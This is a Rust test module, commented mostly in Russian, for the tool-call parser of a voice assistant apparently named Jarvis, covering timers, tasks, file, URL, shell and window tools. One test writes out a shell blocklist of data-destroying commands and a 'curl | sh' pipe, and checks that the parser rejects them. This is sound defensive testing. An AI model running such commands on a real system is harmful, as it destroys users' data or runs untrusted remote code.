        assert!(matches!(
            call(r#"<tool>{"name":"timer","args":{"minutes":5}}</tool>"#),
            Some(ToolCall::SetTimer { seconds: 300, .. })
        ));
    }

    #[test]
    fn parse_unknown_tool_reports_reason() {
        match parse(r#"<tool>{"name":"teleport","args":{"to":"mars"}}</tool>"#) {
            ToolParse::Failed(reason) => assert!(reason.contains("teleport")),
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_missing_args_reports_reason() {
        match parse(r#"<tool>{"name":"open_url","args":{}}</tool>"#) {
            ToolParse::Failed(reason) => assert!(reason.contains("url")),
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_task_tools() {
        assert!(matches!(
            call(r#"<tool>{"name":"task_add","args":{"text":"купить кофе"}}</tool>"#),
            Some(ToolCall::TaskAdd { .. })
        ));
        assert!(matches!(
            call(r#"<tool>{"name":"задача","args":{"text":"позвонить маме"}}</tool>"#),
            Some(ToolCall::TaskAdd { .. })
        ));
        assert!(matches!(
            call(r#"<tool>{"name":"task_list","args":{}}</tool>"#),
            Some(ToolCall::TaskList)
        ));
        assert!(matches!(
            call(r#"<tool>{"name":"выполни задачу","args":{"id":3}}</tool>"#),
            Some(ToolCall::TaskRun { id: Some(3) })
        ));
        assert!(matches!(
            call(r#"<tool>{"name":"task_run","args":{}}</tool>"#),
            Some(ToolCall::TaskRun { id: None })
        ));
        assert!(matches!(
            call(r#"<tool>{"name":"закрой задачу","args":{"id":2}}</tool>"#),
            Some(ToolCall::TaskDone { id: 2 })
        ));
        assert!(matches!(
            call(r#"<tool>{"name":"task_open","args":{}}</tool>"#),
            Some(ToolCall::TaskOpen)
        ));
    }

    #[test]
    fn task_add_without_text_is_not_call() {
        assert!(matches!(
            parse(r#"<tool>{"name":"task_add","args":{}}</tool>"#),
            ToolParse::Failed(_)
        ));
    }

    #[test]
    fn parse_web_search() {
        assert!(matches!(
            call(
                r#"<tool>{"name":"web_search","args":{"query":"дипсик официальный сайт"}}</tool>"#
            ),
            Some(ToolCall::WebSearch { .. })
        ));
        assert!(matches!(
            call(r#"<tool>{"name":"найди сайт","args":{"text":"нетология"}}</tool>"#),
            Some(ToolCall::WebSearch { .. })
        ));
        // Аргумент поиска не должен путаться с адресом: url → open_url.
        assert!(matches!(
            call(r#"<tool>{"name":"open","args":{"url":"https://ya.ru"}}</tool>"#),
            Some(ToolCall::OpenUrl { .. })
        ));
    }

    #[test]
    fn tool_json_complete_detects_finished_block() {
        // Префикс + дописанный JSON: закрывать </tool> не нужно.
        assert!(tool_json_complete(
            r#"<tool>{"name":"open_url","args":{"url":"https://ya.ru"}}"#
        ));
        assert!(tool_json_complete(
            r#"<tool>{"name":"open_url","args":{"url":"https://ya.ru"}}</tool>"#
        ));
        // Ещё не закрыт.
        assert!(!tool_json_complete(
            r#"<tool>{"name":"open_url","args":{"url":"https://deep"#
        ));
        // Скобка внутри строки не должна сбивать баланс.
        assert!(tool_json_complete(
            r#"<tool>{"name":"file_write","args":{"content":"{}"}}"#
        ));
        assert!(!tool_json_complete("просто текст"));
    }

    #[test]
    fn parse_accepts_dangling_close_tag() {
        // Реальный случай: токен с `}}` принёс ещё и начало `</`, генерация
        // остановилась на раннем завершении JSON. Это валидный вызов.
        let text = r#"<tool>{"name":"open_url","args":{"url":"https://www.apple.com"}}</"#;
        assert!(matches!(
            parse(text),
            ToolParse::Call(ToolCall::OpenUrl { url, .. }) if url.contains("apple.com")
        ));
        // Обрывок тега `<`, `</t`, `</tool` — тоже.
        for tail in ["<", "</", "</t", "</tool"] {
            let text =
                format!(r#"<tool>{{"name":"open_url","args":{{"url":"https://ya.ru"}}}}{tail}"#);
            assert!(
                matches!(parse(&text), ToolParse::Call(ToolCall::OpenUrl { .. })),
                "хвост {tail:?} должен разбираться"
            );
        }
    }

    #[test]
    fn lenient_does_not_execute_truncated_mutating_calls() {
        // Обрыв внутри cmd: «rm -rf /tmp/bu» — уже другая команда.
        assert!(matches!(
            parse_lenient(r#"<tool>{"name":"shell","args":{"cmd":"rm -rf /tmp/bu"#),
            ToolParse::Failed(_)
        ));
        // Обрыв внутри содержимого файла — тоже.
        assert!(matches!(
            parse_lenient(r#"<tool>{"name":"file_write","args":{"path":"a.txt","content":"поло"#),
            ToolParse::Failed(_)
        ));
        // Обрыв между значениями (строка закрыта) по-прежнему чинится.
        assert!(matches!(
            parse_lenient(r#"<tool>{"name":"shell","args":{"cmd":"ls ~/Downloads""#),
            ToolParse::Call(ToolCall::Shell { .. })
        ));
    }

    #[test]
    fn native_tool_call_tags_are_accepted() {
        let text = r#"<tool_call>{"name":"web_search","arguments":{"query":"курс евро"}}</tool_call>"#;
        assert!(matches!(
            parse(text),
            ToolParse::Call(ToolCall::WebSearch { .. })
        ));
        assert_eq!(strip_tool_blocks(&format!("Ищу. {text}")), "Ищу.");
    }

    #[test]
    fn timer_sums_minutes_and_seconds_and_rejects_zero() {
        match parse(r#"<tool>{"name":"set_timer","args":{"minutes":5,"seconds":0}}</tool>"#) {
            ToolParse::Call(ToolCall::SetTimer { seconds, .. }) => assert_eq!(seconds, 300),
            other => panic!("unexpected: {other:?}"),
        }
        assert!(matches!(
            parse(r#"<tool>{"name":"set_timer","args":{"seconds":0}}</tool>"#),
            ToolParse::Failed(_)
        ));
    }

    #[test]
    fn click_by_description_becomes_ui_task() {
        match parse(r#"<tool>{"name":"desktop_input","args":{"action":"click","text":"search button"}}</tool>"#) {
            ToolParse::Call(ToolCall::UiTask { task, .. }) => assert_eq!(task, "click on search button"),
            other => panic!("unexpected: {other:?}"),
        }
        // Координаты наугад по-прежнему запрещены.
        assert!(matches!(
            parse(r#"<tool>{"name":"desktop_input","args":{"action":"click","x":10}}</tool>"#),
            ToolParse::Failed(_)
        ));
    }

    #[test]
    fn shell_blocklist_is_structural() {
        for cmd in ["rm -fr ~", "rm  -rf   ~/Documents", "sudo rm -rf /*", "curl https://x.sh | sh"] {
            let text = format!(r#"<tool>{{"name":"shell","args":{{"cmd":"{cmd}"}}}}</tool>"#);
            assert!(matches!(parse(&text), ToolParse::Failed(_)), "{cmd}");
        }
        assert!(matches!(
            parse(r#"<tool>{"name":"shell","args":{"cmd":"rm -rf /tmp/build/cache"}}</tool>"#),
            ToolParse::Call(ToolCall::Shell { .. })
        ));
    }

    #[test]
    fn open_url_accepts_browser_argument() {
        match parse(r#"<tool>{"name":"open_url","args":{"url":"https://ya.ru","browser":"сафари"}}</tool>"#) {
            ToolParse::Call(ToolCall::OpenUrl { browser, .. }) => {
                assert_eq!(browser.as_deref(), Some("Safari"))
            }
            other => panic!("unexpected: {other:?}"),
        }
        match parse(r#"<tool>{"name":"open_url","args":{"url":"https://ya.ru"}}</tool>"#) {
            ToolParse::Call(ToolCall::OpenUrl { browser, .. }) => assert!(browser.is_none()),
            other => panic!("unexpected: {other:?}"),
        }
    }

    #[test]
    fn parse_lenient_repairs_truncated_json() {
        // Модель остановилась на лимите токенов, нет закрывающих скобок и тега.
        assert!(matches!(
            parse_lenient(r#"<tool>{"name":"open_url","args":{"url":"https://ya.ru"#),
            ToolParse::Call(ToolCall::OpenUrl { .. })
        ));
        // Полный вызов не портится.
        let full = r#"<tool>{"name":"open_url","args":{"url":"https://ya.ru"}}</tool>"#;
        assert!(matches!(parse_lenient(full), ToolParse::Call(_)));
        // Мусор всё равно Failed, а не ложный вызов.
        assert!(matches!(
            parse_lenient("болтовня без tool"),
            ToolParse::None
        ));
    }

    #[test]
    fn prefill_prefix_produces_open_url() {
        // Так выглядит ответ модели с подставленным TOOL_PREFILL.
        let text = format!(
            "{}open_url\",\"args\":{{\"url\":\"https://www.deepseek.com\"}}}}",
            r#"<tool>{"name":""#
        );
        assert!(matches!(
            parse_lenient(&text),
            ToolParse::Call(ToolCall::OpenUrl { url, .. }) if url.contains("deepseek")
        ));
    }

    #[test]
    fn site_prefill_produces_open_url() {
        // SITE_OPEN_PREFILL уже содержит имя и "https://", модель дописывает домен.
        let text = format!("{}netflix.com\"}}}}", crate::llm::SITE_OPEN_PREFILL);
        assert!(matches!(
            parse_lenient(&text),
            ToolParse::Call(ToolCall::OpenUrl { url, .. }) if url == "https://netflix.com"
        ));
    }

    #[test]
    fn failure_speech_strips_raw_json() {
        let text = r#"<tool>{"name":"teleport","args":{"to":"mars"}}</tool>"#;
        let speech = failure_speech(text, "неизвестный инструмент");
        assert!(!speech.contains("<tool>"));
        assert!(!speech.contains("teleport"));
    }

    #[test]
    fn failure_speech_keeps_prose() {
        let text = r#"Не получится. <tool>{"name":"teleport"}</tool>"#;
        assert_eq!(failure_speech(text, "err"), "Не получится.");
    }

    #[test]
    fn expand_path_home() {
        let p = expand_path("~/Documents/file.txt");
        assert!(!p.starts_with('~'));
        assert!(p.contains("Documents"));
    }

    #[test]
    fn humanize_basic() {
        assert_eq!(humanize_seconds(10), "10 секунд");
        assert_eq!(humanize_seconds(60), "1 минуту");
        assert_eq!(humanize_seconds(600), "10 минут");
        assert_eq!(humanize_seconds(3600), "1 час");
    }

    #[test]
    fn read_lines_are_numbered_and_paged() {
        let content = "a\nb\nc\nd\n";
        assert_eq!(read_lines(content, None, None), "1| a\n2| b\n3| c\n4| d");
        // Вторая страница по две строки: модель видит, откуда продолжать.
        let page = read_lines(content, None, Some(2));
        assert!(page.starts_with("1| a\n2| b"), "{page}");
        assert!(page.contains("offset=3"), "{page}");
        assert_eq!(read_lines(content, Some(3), Some(2)), "3| c\n4| d");
        assert_eq!(read_lines("", None, None), "Файл пустой");
        // Строка длиннее лимита обрезается, а не рвёт вывод.
        let long = "x".repeat(500);
        let out = read_lines(&long, None, None);
        assert!(out.ends_with('…'), "длинная строка должна обрезаться");
    }

    #[test]
    fn apply_edit_refuses_to_guess() {
        let content = "fn main() {\n    println!(\"привет\");\n}\n";
        // Точная замена работает.
        let (updated, count) = apply_edit(content, "привет", "пока", false).unwrap();
        assert_eq!(count, 1);
        assert!(updated.contains("пока"));
        // Отсутствующий фрагмент — честная ошибка, а не молчаливый «успех».
        let missing = apply_edit(content, "нет такого", "x", false).unwrap_err();
        assert!(missing.contains("не найден"), "{missing}");
        // Неоднозначный фрагмент без all=true тоже отклоняется.
        let ambiguous = apply_edit("a a", "a", "b", false).unwrap_err();
        assert!(ambiguous.contains("2 раз"), "{ambiguous}");
        let (all, count) = apply_edit("a a", "a", "b", true).unwrap();
        assert_eq!((all.as_str(), count), ("b b", 2));
        // Пустой old — защита от затирания файла целиком.
        assert!(apply_edit(content, "", "x", false).is_err());
    }

    #[test]
    fn glob_match_handles_masks() {
        assert!(glob_match("*.rs", "main.rs"));
        assert!(!glob_match("*.rs", "main.rss"));
        assert!(!glob_match("*.rs", "main.py"));
        assert!(glob_match("test_?.txt", "test_1.txt"));
        assert!(!glob_match("test_?.txt", "test_12.txt"));
        assert!(glob_match("*readme*", "readme"));
        assert!(glob_match("**/*.md", "docs/ui/note.md"));
        assert!(!glob_match("*.md", "note.txt"));
    }

    #[test]
    fn parse_new_file_tools() {
        assert!(matches!(
            call(r#"<tool>{"name":"file_append","args":{"path":"n.txt","content":"x"}}</tool>"#),
            Some(ToolCall::FileAppend { .. })
        ));
        assert!(matches!(
            call(
                r#"<tool>{"name":"file_edit","args":{"path":"n.txt","old":"a","new":"b"}}</tool>"#
            ),
            Some(ToolCall::FileEdit { all: false, .. })
        ));
        assert!(matches!(
            call(r#"<tool>{"name":"file_search","args":{"query":"fn main"}}</tool>"#),
            Some(ToolCall::FileSearch { .. })
        ));
        assert!(matches!(
            call(r#"<tool>{"name":"file_glob","args":{"pattern":"*.rs"}}</tool>"#),
            Some(ToolCall::FileGlob { .. })
        ));
        // file_read с диапазоном строк: без него модель читала только начало.
        match call(
            r#"<tool>{"name":"file_read","args":{"path":"a.rs","offset":10,"limit":5}}</tool>"#,
        ) {
            Some(ToolCall::FileRead { offset, limit, .. }) => {
                assert_eq!((offset, limit), (Some(10), Some(5)));
            }
            other => panic!("unexpected: {other:?}"),
        }
        // file_list без path смотрит в рабочую директорию, а не падает.
        assert!(matches!(
            call(r#"<tool>{"name":"file_list","args":{}}</tool>"#),
            Some(ToolCall::FileList { .. })
        ));
    }

    fn temp_dir(label: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "jarvis-tools-{label}-{}-{:?}",
            std::process::id(),
            std::thread::current().id()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn search_finds_lines_with_numbers() {
        let dir = temp_dir("search");
        std::fs::write(dir.join("a.txt"), "альфа\nбета\nгамма\n").unwrap();
        std::fs::write(dir.join("b.txt"), "нет совпадений\n").unwrap();
        std::fs::create_dir_all(dir.join("target")).unwrap();
        std::fs::write(dir.join("target").join("c.txt"), "бета\n").unwrap();

        let report = search_in_path(dir.to_str().unwrap(), "бета", 1).unwrap();
        assert!(report.contains("a.txt:2"), "{report}");
        assert!(report.contains("1-  альфа"), "контекст не попал: {report}");
        // Служебные каталоги не обходим: в target искать нечего.
        assert!(!report.contains("c.txt"), "{report}");
        assert!(
            search_in_path(dir.to_str().unwrap(), "ничего такого", 0)
                .unwrap()
                .is_empty()
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn glob_finds_files_by_mask() {
        let dir = temp_dir("glob");
        std::fs::create_dir_all(dir.join("src")).unwrap();
        std::fs::write(dir.join("src").join("main.rs"), "fn main() {}").unwrap();
        std::fs::write(dir.join("src").join("mod.py"), "pass").unwrap();
        std::fs::write(dir.join("README.md"), "# привет").unwrap();

        let found = glob_in_path(dir.to_str().unwrap(), "*.rs").unwrap();
        assert!(found.contains("main.rs"), "{found}");
        assert!(!found.contains("mod.py"), "{found}");
        let md = glob_in_path(dir.to_str().unwrap(), "*.md").unwrap();
        assert!(md.contains("README.md"), "{md}");
        // Регистр не должен мешать: «readme» находит «README.md».
        let lower = glob_in_path(dir.to_str().unwrap(), "*readme*").unwrap();
        assert!(lower.contains("README.md"), "{lower}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn list_dir_reports_types_and_sizes() {
        let dir = temp_dir("list");
        std::fs::write(dir.join("note.txt"), "12345").unwrap();
        std::fs::create_dir_all(dir.join("sub")).unwrap();
        std::fs::write(dir.join(".hidden"), "x").unwrap();

        let list = list_dir(dir.to_str().unwrap()).unwrap();
        assert!(list.contains("note.txt (5 б)"), "{list}");
        assert!(list.contains("sub/"), "{list}");
        assert!(!list.contains(".hidden"), "{list}");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn resolve_path_uses_cwd_and_home() {
        // Глобальную рабочую директорию не трогаем: тесты идут параллельно,
        // и подмена общего состояния ломала бы соседние проверки.
        let base = "/tmp/jarvis-base";
        assert_eq!(
            resolve_path_from("note.txt", base),
            "/tmp/jarvis-base/note.txt"
        );
        assert_eq!(
            resolve_path_from("src/main.rs", base),
            "/tmp/jarvis-base/src/main.rs"
        );
        // Абсолютный путь не трогаем.
        assert_eq!(resolve_path_from("/etc/hosts", base), "/etc/hosts");
        // `~` разворачивается до домашнего каталога, а не до базы.
        let home = resolve_path_from("~/Documents", base);
        assert!(!home.starts_with('~') && !home.starts_with(base), "{home}");
    }

    #[test]
    fn cd_target_is_extracted_from_chain() {
        let dir = temp_dir("cd");
        let p = dir.to_str().unwrap().to_string();
        // `set_cwd` канонизирует путь, поэтому сравниваем через resolve_path_from.
        let expected = resolve_path_from(&p, "/");
        assert_eq!(
            parse_cd_target(&format!("cd {p} && ls")),
            Some(expected.clone())
        );
        assert_eq!(
            parse_cd_target(&format!("cd \"{p}\"; pwd")),
            Some(expected.clone())
        );
        assert_eq!(parse_cd_target("ls -la"), None);
        assert_eq!(parse_cd_target("cd"), None);
        assert_eq!(parse_cd_target("cd -"), None);
        assert_eq!(parse_cd_target("cd /нет/такого/пути"), None);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn window_request_accepts_application_phrasing() {
        // Живой случай: «сверни приложение рио» мимо быстрого пути уходило
        // к LLM, а та из примера в промпте подставляла чужое имя («зум»).
        assert_eq!(
            window_request_from_prompt("сверни приложение рио"),
            Some(("minimize".to_string(), Some("рио".to_string())))
        );
        assert_eq!(
            window_request_from_prompt("разверни программу зед"),
            Some(("maximize".to_string(), Some("зед".to_string())))
        );
        // Без имени «приложение» — не гадаем (решает модель).
        assert_eq!(window_request_from_prompt("сверни приложение"), None);
        // Прежнее поведение: «окно» без имени — окно Джарвиса.
        assert_eq!(
            window_request_from_prompt("сверни окно"),
            Some(("minimize".to_string(), None))
        );
        // «Закрой джарвис» — это выход, а не окно.
        assert_eq!(window_request_from_prompt("закрой джарвис"), None);
    }

    #[test]
    fn window_request_routes_self_close_focus_and_list() {
        for (prompt, action, app) in [
            ("Сверни окно голосового помощника", "minimize", None),
            ("сверни окно телеграма", "minimize", Some("телеграма")),
            ("Окно телеграма сверни", "minimize", Some("телеграма")),
            ("разверни окно сафари", "maximize", Some("сафари")),
            ("восстанови окно джарвиса", "restore", None),
            ("закрой окно телеграма", "close", Some("телеграма")),
            ("закрой окно", "close", None),
            ("сверни активное окно", "minimize", Some("активное")),
            ("переключись на телеграм", "focus", Some("телеграм")),
            ("активируй сафари", "focus", Some("сафари")),
            ("покажи список окон", "list", None),
            ("покажи окна", "list", None),
            ("какие окна открыты", "list", None),
        ] {
            assert_eq!(
                window_request_from_prompt(prompt),
                Some((action.to_string(), app.map(str::to_string))),
                "{prompt}"
            );
        }
        // «Закрой приложение X» / «закрой X» — выход приложения, не окно.
        assert_eq!(
            window_request_from_prompt("закрой приложение телеграм"),
            None
        );
        assert_eq!(window_request_from_prompt("закрой телеграм"), None);
    }

    #[test]
    fn parse_quit_app_aliases_and_arguments() {
        for (text, want) in [
            (
                r#"<tool>{"name":"quit_app","args":{"name":"Telegram"}}</tool>"#,
                "Telegram",
            ),
            (
                r#"<tool>{"name":"закрой приложение","args":{"app":"телеграм"}}</tool>"#,
                "телеграм",
            ),
            (
                r#"<tool>{"name":"quit","args":{"application":"Safari"}}</tool>"#,
                "Safari",
            ),
            (
                r#"<tool>{"name":"close_app","args":{"app_name":"Zoom"}}</tool>"#,
                "Zoom",
            ),
        ] {
            match call(text) {
                Some(ToolCall::QuitApp { name }) => assert_eq!(name, want, "{text}"),
                other => panic!("для «{text}» ждали quit_app {want}, получили {other:?}"),
            }
        }
        // Без имени приложения вызов не должен молча превращаться в window close.
        assert!(matches!(
            parse(r#"<tool>{"name":"quit_app","args":{}}</tool>"#),
            ToolParse::Failed(_)
        ));
        // Оконный инструмент закрывает окно, а не приложение.
        assert!(matches!(
            call(r#"<tool>{"name":"window","args":{"action":"закрыть"}}</tool>"#),
            Some(ToolCall::Window { action, app })
                if action == "close" && app.is_none()
        ));
    }

    /// Живая жалоба: «открой утилиты» уезжал в LLM, где в каталоге был
    /// только close_utils — и просьба открывать выполнялась наоборот.
    #[test]
    fn utils_window_request_distinguishes_open_from_close() {
        assert_eq!(utils_window_request("открой утилиты"), Some(false));
        assert_eq!(utils_window_request("покажи утилиты"), Some(false));
        assert_eq!(
            utils_window_request("джарвис, открой окно утилит"),
            Some(false)
        );
        assert_eq!(utils_window_request("закрой утилиты"), Some(true));
        assert_eq!(utils_window_request("выключи утилиты"), Some(true));
        // Ни «утилит», ни глагола — не сюда.
        assert_eq!(utils_window_request("открой браузер"), None);
        assert_eq!(utils_window_request("какие есть утилиты"), None);
    }

    #[test]
    fn open_utils_tool_is_executable() {
        assert!(matches!(
            call(r#"<tool>{"name":"open_utils","args":{"tab":"calendar"}}</tool>"#),
            Some(ToolCall::OpenUtils { tab: Some(t) }) if t == "calendar"
        ));
        // Русское название вкладки приводится к канону фронтенда.
        assert!(matches!(
            call(r#"<tool>{"name":"open_utils","args":{"tab":"секундомер"}}</tool>"#),
            Some(ToolCall::OpenUtils { tab: Some(t) }) if t == "stopwatch"
        ));
        // Вкладка необязательна.
        assert!(matches!(
            call(r#"<tool>{"name":"open_utils","args":{}}</tool>"#),
            Some(ToolCall::OpenUtils { tab: None })
        ));
        // Так выглядит ответ модели с форсированным prefill.
        let text = format!("{}open_utils\",\"args\":{{}}}}", r#"<tool>{"name":""#);
        assert!(matches!(
            parse_lenient(&text),
            ToolParse::Call(ToolCall::OpenUtils { .. })
        ));
    }

    #[test]
    fn reactor_intro_request_needs_verb_and_object() {
        for phrase in [
            "проиграй анимацию реактора",
            "Джарвис, покажи анимацию реактора",
            "повтори заставку",
            "собери реактор снова и покажи сборку",
        ] {
            assert!(reactor_intro_request(phrase), "{phrase}");
        }
        // Без глагола действия — не просьба сыграть анимацию. Глагол есть,
        // объекта нет — это другая дорога (утилиты, браузер).
        for phrase in [
            "что такое анимация реактора",
            "открой утилиты",
            "покажи браузер",
        ] {
            assert!(!reactor_intro_request(phrase), "{phrase}");
        }
    }

    #[test]
    fn play_reactor_intro_tool_is_executable() {
        assert!(matches!(
            call(r#"<tool>{"name":"play_reactor_intro","args":{}}</tool>"#),
            Some(ToolCall::PlayReactorIntro)
        ));
        // Русские алиасы той же команды.
        assert!(matches!(
            call(r#"<tool>{"name":"проиграй_анимацию_реактора","args":{}}</tool>"#),
            Some(ToolCall::PlayReactorIntro)
        ));
        assert_eq!(tool_name(&ToolCall::PlayReactorIntro), "play_reactor_intro");
    }
}